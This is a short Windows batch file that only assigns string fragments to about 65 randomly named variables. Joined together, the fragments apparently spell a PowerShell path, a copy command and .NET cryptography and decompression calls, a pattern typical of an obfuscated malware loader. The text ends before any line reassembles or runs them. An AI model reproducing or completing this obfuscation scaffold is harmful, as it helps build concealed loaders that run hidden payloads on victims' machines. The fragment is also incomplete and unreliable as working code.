@echo off
set "SplvhKmzce= C"
set "RPAmSNWlrQ=ws"
set "reHcxGQynq=he"
set "ITQJNKrgqg=Wi"
set "sgiVCxsEdK=Sy"
set "wrNxOjRewK=py"
set "LakjdXMJph=po"
set "oJiFSmiTrS=\W"
set "dippapcdJm=rS"
set "AbUTRBndEU=ll"
set "TYhDMmRNTH=xe"
set "dVbabZyCIw=s\"
set "NDLqHaYcaO=co"
set "rslytsECTt=we"
set "rPeAhHgWdw=:\"
set "PajHrmabpb=y "
set "YQHMDGretZ=32"
set "uhIiOqZemZ=.e"
set "uJjerrnnxZ=he"
set "CTxAwxspjW=nd"
set "oQMhIjTUmg=st"
set "FVfGLyjaEb=do"
set "wfQjdGSxyx=em"
set "YdnpKyEcSz=ll"
set "ntprXLAhov= /"
set "NuafWdeOCM=rs"
set "rxwAXnLjbN=1."
set "CfoDvaUaFB=0\"
set "yYfGsuAfMp=Po"
set "WaSkYAGNrx=we"
set "jtrXMpJPGc=\v"
set "NzZWxGnmph=ow"
set "fDqBZnpYSV=in"
set "SghTcDzVeC= %~dp0"
set "btHBIZhPlE=cd"
set "hPzSEtwwEV= '')"
set "VnrntKgnjH=gsYZ"
set "vvxkRGWDkV=join"
set "cmHETPBIFe=dj0C"
set "sINspoEGTp=se()"
set "TVTTGLsHev=[Sys"
set "ogLUvClovI=tem."
set "ktkkZfPwoh=.Dis"
set "PgruFDhUGS=.Cry"
set "FFvSOVJOZU=rans"
set "fXIxGUrUXr=e = "
set "MjvWAOkGhW=Comp"
set "nXYdfQgUqU= [st"
set "iAnDTuicjB=]::("
set "DfVzHuArJE=ress"
set "NizfZeDeYj=ne);"
set "bCtrHDXuET=Dvye"
set "WGCiiqEARl=bstr"
set "PcHbbbfEeP=ress"
set "hQYTOnbXrF===')"
set "TUNEFTbnWX=nirt"
set "xhGcNXflkq=raph"
set "cSVYPCVriZ=106u"
set "dAEICzBFxE=tem."
set "MXhllsWQVn=d;$P"
set "tdDVEQjdBQ=ring"
set "MwNvFNFwax=m(, "
set "dwztgapjTk=ty.T"
